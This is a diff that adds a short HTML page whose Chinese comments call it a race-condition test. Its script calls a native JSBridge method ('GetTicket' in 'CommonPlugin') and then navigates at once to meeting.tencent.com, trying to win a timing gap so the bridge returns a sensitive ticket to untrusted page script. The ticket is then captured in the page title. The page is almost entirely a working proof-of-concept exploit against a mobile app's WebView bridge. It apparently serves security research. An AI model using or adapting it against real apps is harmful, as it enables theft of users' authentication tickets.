@@ -1,0 +1,20 @@
+<html><body><script>
+// 竞态测试：调用敏感 JSBridge 后立刻导航到合法域名
+if (window.JSCallJavaMgr) {
+    // 1. 发起敏感 API 调用
+    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+        callback: "cb_race",
+        module: "CommonPlugin",
+        method: "GetTicket",
+        param: {},
+        callId: "race_test"
+    }));
+    
+    // 2. 立刻导航到合法域名（尝试打时间差）
+    window.location.href = "https://meeting.tencent.com";
+}
+
+window.cb_race = function(r) {
+    document.title = "RESULT:" + r;
+};
+</script><p>Racing...</p></body></html>
